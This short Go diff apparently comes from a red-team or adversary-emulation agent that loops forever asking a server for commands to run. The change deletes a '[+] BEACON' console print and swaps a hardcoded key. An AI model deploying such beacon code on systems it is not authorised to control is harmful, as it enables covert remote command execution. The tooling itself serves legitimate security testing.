@@ -17,7 +17,6 @@ import (
 var iteration = 60
 
 func askForInstructions(server string, group string, paw string) {
-	fmt.Println("[+] BEACON")
 	commands := api.Instructions(server, group, paw)
 	if commands != nil && len(commands.([]interface{})) > 0 {
 		cmds := reflect.ValueOf(commands)
@@ -48,4 +47,4 @@ func main() {
 	for { askForInstructions(*server, *group, paw) }
 }
 
-var key = "EUXQD2S7PPSFQISZKEHCAIPRCLLZKV"
+var key = "KMFP9A6VX7S774V93L5ASD9LMG0RSE"
